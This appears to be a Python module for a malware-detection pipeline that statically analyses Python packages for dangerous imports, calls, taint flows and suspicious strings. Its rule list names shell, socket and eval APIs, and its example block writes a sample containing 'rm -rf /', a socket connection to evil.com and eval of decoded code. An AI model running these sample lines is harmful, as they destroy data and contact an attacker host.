# ========================================
# component_a_static.py
# Component A: Enhanced Static Analysis
# ========================================

"""
Thư viện: ast, networkx, typing
"""

import ast
import json
from pathlib import Path
from typing import List, Dict, Set, Any
import re
from collections import defaultdict, Counter

class EnhancedStaticAnalyzer:
    """
    Component A: Enhanced Static Analysis
    - AST parsing
    - API detection
    - Type inference
    - Dataflow analysis
    """
    
    def __init__(self, rules_path: str = 'rules/dangerous_apis.json'):
        self.rules_path = Path(rules_path)
        self._load_rules()
    
    def _load_rules(self):
        """Load dangerous API rules"""
        if self.rules_path.exists():
            with open(self.rules_path, 'r') as f:
                rules = json.load(f)
        else:
            # Default rules
            rules = {
                "dangerous_imports": {
                    "os": ["system", "popen", "exec", "execl", "execle", "execlp"],
                    "subprocess": ["call", "Popen", "run", "check_output"],
                    "socket": ["socket", "connect", "send", "sendall"],
                    "eval": ["eval", "exec", "compile"],
                    "pickle": ["loads", "load"],
                    "marshal": ["loads", "load"],
                    "__builtin__": ["eval", "exec", "compile", "__import__"],
                },
                "dangerous_functions": [
                    "eval", "exec", "compile", "__import__", 
                    "execfile", "input",
                ],
                "file_operations": [
                    "open", "write", "read", "remove", "rmdir",
                    "chmod", "chown", "mkdir", "makedirs"
                ],
                "network_operations": [
                    "urlopen", "urlretrieve", "get", "post",
                    "connect", "send", "recv", "socket"
                ]
            }
        
        self.dangerous_imports = rules.get("dangerous_imports", {})
        self.dangerous_functions = set(rules.get("dangerous_functions", []))
        self.file_operations = set(rules.get("file_operations", []))
        self.network_operations = set(rules.get("network_operations", []))
    
    def analyze_file(self, filepath: Path) -> Dict:
        """
        Phân tích một Python file
        
        Returns:
            Dict chứa static analysis features
        """
        features = {
            'filepath': str(filepath),
            'analyzed': False,
            
            # Import analysis
            'imports': [],
            'dangerous_imports': [],
            'suspicious_modules': [],
            
            # Function analysis
            'functions_defined': 0,
            'functions_called': [],
            'dangerous_calls': [],
            
            # API usage
            'file_operations': [],
            'network_operations': [],
            'process_spawning': [],
            'code_execution': [],
            
            # Type inference
            'dynamic_types': [],
            'type_confusion_risk': False,
            
            # Dataflow
            'tainted_flows': [],
            'sink_locations': [],
            
            # Code complexity
            'cyclomatic_complexity': 0,
            'max_nesting_depth': 0,
            'lines_of_code': 0,
            
            # Strings
            'string_literals': [],
            'suspicious_strings': []
        }
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                source_code = f.read()
            
            # Parse AST
            tree = ast.parse(source_code, filename=str(filepath))
            features['analyzed'] = True
            features['lines_of_code'] = len(source_code.split('\n'))
            
            # Run analyses
            self._analyze_imports(tree, features)
            self._analyze_functions(tree, features)
            self._analyze_api_usage(tree, features)
            self._analyze_types(tree, features)
            self._analyze_dataflow(tree, features)
            self._analyze_complexity(tree, features)
            self._analyze_strings(tree, features)
            
        except SyntaxError as e:
            features['error'] = f'Syntax error: {e}'
        except Exception as e:
            features['error'] = f'Analysis error: {e}'
        
        return features
    
    def _analyze_imports(self, tree: ast.AST, features: Dict):
        """Analyze imports"""
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    features['imports'].append(alias.name)
                    
                    # Check if dangerous
                    if alias.name in self.dangerous_imports:
                        features['dangerous_imports'].append({
                            'module': alias.name,
                            'line': node.lineno
                        })
            
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    features['imports'].append(node.module)
                    
                    if node.module in self.dangerous_imports:
                        imported_names = [alias.name for alias in node.names]
                        features['dangerous_imports'].append({
                            'module': node.module,
                            'names': imported_names,
                            'line': node.lineno
                        })
    
    def _analyze_functions(self, tree: ast.AST, features: Dict):
        """Analyze function definitions and calls"""
        for node in ast.walk(tree):
            # Function definitions
            if isinstance(node, ast.FunctionDef):
                features['functions_defined'] += 1
            
            # Function calls
            elif isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                if func_name:
                    features['functions_called'].append(func_name)
                    
                    # Check if dangerous
                    if func_name in self.dangerous_functions:
                        features['dangerous_calls'].append({
                            'function': func_name,
                            'line': node.lineno
                        })
    
    def _analyze_api_usage(self, tree: ast.AST, features: Dict):
        """Analyze API usage patterns"""
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                
                if not func_name:
                    continue
                
                # File operations
                if func_name in self.file_operations:
                    features['file_operations'].append({
                        'function': func_name,
                        'line': node.lineno
                    })
                
                # Network operations
                elif func_name in self.network_operations:
                    features['network_operations'].append({
                        'function': func_name,
                        'line': node.lineno
                    })
                
                # Process spawning
                elif func_name in ['system', 'popen', 'Popen', 'call', 'run']:
                    features['process_spawning'].append({
                        'function': func_name,
                        'line': node.lineno
                    })
                
                # Code execution
                elif func_name in ['eval', 'exec', 'compile', '__import__']:
                    features['code_execution'].append({
                        'function': func_name,
                        'line': node.lineno
                    })
    
    def _analyze_types(self, tree: ast.AST, features: Dict):
        """Simple type inference"""
        for node in ast.walk(tree):
            # Look for dynamic type operations
            if isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                
                # Dynamic type operations
                if func_name in ['type', 'isinstance', 'hasattr', 'getattr', 'setattr']:
                    features['dynamic_types'].append({
                        'function': func_name,
                        'line': node.lineno
                    })
                
                # Type confusion indicators
                if func_name == 'eval' or func_name == 'exec':
                    features['type_confusion_risk'] = True
    
    def _analyze_dataflow(self, tree: ast.AST, features: Dict):
        """
        Simple dataflow analysis
        Track tainted data from sources to sinks
        """
        # Sources: user input, network, files
        sources = {'input', 'raw_input', 'recv', 'read', 'readline'}
        
        # Sinks: dangerous operations
        sinks = {'eval', 'exec', 'system', 'popen', 'compile'}
        
        # Track assignments
        tainted_vars = set()
        
        for node in ast.walk(tree):
            # Check for sources
            if isinstance(node, ast.Call):
                func_name = self._get_func_name(node.func)
                
                if func_name in sources:
                    # If assigned to a variable, track it
                    parent = getattr(node, 'parent', None)
                    if isinstance(parent, ast.Assign):
                        for target in parent.targets:
                            if isinstance(target, ast.Name):
                                tainted_vars.add(target.id)
                
                # Check for sinks using tainted data
                if func_name in sinks:
                    for arg in node.args:
                        if isinstance(arg, ast.Name) and arg.id in tainted_vars:
                            features['tainted_flows'].append({
                                'var': arg.id,
                                'sink': func_name,
                                'line': node.lineno
                            })
                            features['sink_locations'].append(node.lineno)
    
    def _analyze_complexity(self, tree: ast.AST, features: Dict):
        """Analyze code complexity"""
        # Cyclomatic complexity (simplified)
        decision_points = 0
        max_depth = 0
        
        def count_depth(node, current_depth=0):
            nonlocal max_depth
            max_depth = max(max_depth, current_depth)
            
            for child in ast.iter_child_nodes(node):
                if isinstance(child, (ast.If, ast.For, ast.While, ast.With)):
                    count_depth(child, current_depth + 1)
                else:
                    count_depth(child, current_depth)
        
        for node in ast.walk(tree):
            if isinstance(node, (ast.If, ast.For, ast.While, ast.ExceptHandler)):
                decision_points += 1
        
        count_depth(tree)
        
        features['cyclomatic_complexity'] = decision_points + 1
        features['max_nesting_depth'] = max_depth
    
    def _analyze_strings(self, tree: ast.AST, features: Dict):
        """Analyze string literals"""
        for node in ast.walk(tree):
            string_val = None
            
            if isinstance(node, ast.Str):
                string_val = node.s
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                string_val = node.value
            
            if string_val:
                features['string_literals'].append(string_val)
                
                # Check for suspicious patterns
                if self._is_suspicious_string(string_val):
                    features['suspicious_strings'].append({
                        'value': string_val[:100],  # Truncate
                        'line': node.lineno
                    })
    
    def _is_suspicious_string(self, s: str) -> bool:
        """Check if string is suspicious"""
        # URLs
        if re.match(r'https?://', s):
            return True
        
        # IP addresses
        if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', s):
            return True
        
        # Base64-like strings (long alphanumeric)
        if len(s) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', s):
            return True
        
        # Hex strings
        if len(s) > 20 and re.match(r'^[0-9a-fA-F]+$', s):
            return True
        
        return False
    
    def _get_func_name(self, node) -> str:
        """Get function name from call node"""
        if isinstance(node, ast.Name):
            return node.id
        elif isinstance(node, ast.Attribute):
            return node.attr
        elif isinstance(node, ast.Call):
            return self._get_func_name(node.func)
        return ''
    
    def extract_features_vector(self, analysis: Dict) -> Dict:
        """
        Convert analysis results to feature vector for ML
        
        Returns 25+ features
        """
        features = {
            # Import features (5)
            'total_imports': len(analysis.get('imports', [])),
            'dangerous_imports_count': len(analysis.get('dangerous_imports', [])),
            'has_os_import': 'os' in analysis.get('imports', []),
            'has_subprocess_import': 'subprocess' in analysis.get('imports', []),
            'has_socket_import': 'socket' in analysis.get('imports', []),
            
            # Function features (5)
            'functions_defined': analysis.get('functions_defined', 0),
            'functions_called_count': len(analysis.get('functions_called', [])),
            'dangerous_calls_count': len(analysis.get('dangerous_calls', [])),
            'unique_functions': len(set(analysis.get('functions_called', []))),
            'function_density': analysis.get('functions_defined', 0) / max(analysis.get('lines_of_code', 1), 1),
            
            # API usage features (5)
            'file_operations_count': len(analysis.get('file_operations', [])),
            'network_operations_count': len(analysis.get('network_operations', [])),
            'process_spawning_count': len(analysis.get('process_spawning', [])),
            'code_execution_count': len(analysis.get('code_execution', [])),
            'has_api_abuse': (len(analysis.get('file_operations', [])) + 
                             len(analysis.get('network_operations', [])) + 
                             len(analysis.get('process_spawning', []))) > 5,
            
            # Type features (3)
            'dynamic_types_count': len(analysis.get('dynamic_types', [])),
            'type_confusion_risk': 1 if analysis.get('type_confusion_risk', False) else 0,
            'has_dynamic_operations': len(analysis.get('dynamic_types', [])) > 0,
            
            # Dataflow features (3)
            'tainted_flows_count': len(analysis.get('tainted_flows', [])),
            'sink_locations_count': len(analysis.get('sink_locations', [])),
            'has_tainted_sink': len(analysis.get('tainted_flows', [])) > 0,
            
            # Complexity features (4)
            'cyclomatic_complexity': analysis.get('cyclomatic_complexity', 0),
            'max_nesting_depth': analysis.get('max_nesting_depth', 0),
            'lines_of_code': analysis.get('lines_of_code', 0),
            'complexity_per_line': analysis.get('cyclomatic_complexity', 0) / max(analysis.get('lines_of_code', 1), 1),
        }
        
        return features
    
    def analyze_package(self, python_files: List[Path]) -> Dict:
        """
        Analyze all files in a package
        
        Returns:
            Aggregated analysis with feature vector
        """
        print(f"\n[Component A] Analyzing {len(python_files)} files...")
        
        all_analyses = []
        aggregated_features = defaultdict(int)
        
        for py_file in python_files:
            analysis = self.analyze_file(py_file)
            if analysis.get('analyzed', False):
                all_analyses.append(analysis)
                
                # Aggregate features
                file_features = self.extract_features_vector(analysis)
                for key, value in file_features.items():
                    if isinstance(value, (int, float)):
                        aggregated_features[key] += value
                    elif isinstance(value, bool):
                        aggregated_features[key] += (1 if value else 0)
        
        # Calculate package-level features
        num_files = len(all_analyses)
        if num_files > 0:
            for key in aggregated_features:
                if 'count' in key or 'total' in key:
                    pass  # Keep as sum
                else:
                    aggregated_features[key] /= num_files  # Average
        
        result = {
            'component': 'A_static',
            'files_analyzed': num_files,
            'individual_analyses': all_analyses,
            'aggregated_features': dict(aggregated_features),
            'feature_count': len(aggregated_features)
        }
        
        print(f"  ✓ Extracted {len(aggregated_features)} static features")
        
        return result


# ===== EXAMPLE USAGE =====
if __name__ == '__main__':
    from pathlib import Path
    
    analyzer = EnhancedStaticAnalyzer()
    
    # Test with a Python file
    test_file = Path('test_malicious.py')
    
    # Create test file
    test_code = '''
import os
import socket
import base64

def malicious_func():
    os.system("rm -rf /")
    s = socket.socket()
    s.connect(("evil.com", 1337))
    eval(base64.b64decode("malicious_code"))
'''
    
    with open(test_file, 'w') as f:
        f.write(test_code)
    
    # Analyze
    result = analyzer.analyze_file(test_file)
    features = analyzer.extract_features_vector(result)
    
    print("\n" + "="*60)
    print("COMPONENT A - STATIC ANALYSIS")
    print("="*60)
    print(f"Dangerous imports: {len(result['dangerous_imports'])}")
    print(f"Dangerous calls: {len(result['dangerous_calls'])}")
    print(f"Network operations: {len(result['network_operations'])}")
    print(f"Code execution: {len(result['code_execution'])}")
    print(f"\nFeature vector: {len(features)} features")
    
    # Cleanup
    test_file.unlink()





